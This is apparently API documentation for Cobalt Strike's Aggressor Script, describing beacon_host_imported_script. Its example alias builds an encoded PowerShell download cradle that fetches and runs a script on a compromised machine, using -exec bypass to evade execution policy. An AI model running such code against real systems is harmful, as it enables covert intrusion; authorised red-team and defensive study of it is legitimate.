beacon_host_imported_script

Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.

#### Arguments

`$1` - the id of the Beacon to host this script with.

#### Returns

A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!

#### Example

```
alias powershell {
   local('$args $cradle $runme $cmd');
   
   # $0 is the entire command with no parsing.
   $args   = substr($0, 11);
   
   # generate the download cradle (if one exists) for an imported PowerShell script
   $cradle = beacon_host_imported_script($1);
   
   # encode our download cradle AND cmdlet+args we want to run
   $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
   
   # Build up our entire command line.
   $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
   
   # task Beacon to run all of this.
   btask($1, "Tasked beacon to run: $args", "T1086");
   beacon_execute_job($1, "powershell", $cmd, 1);
}```

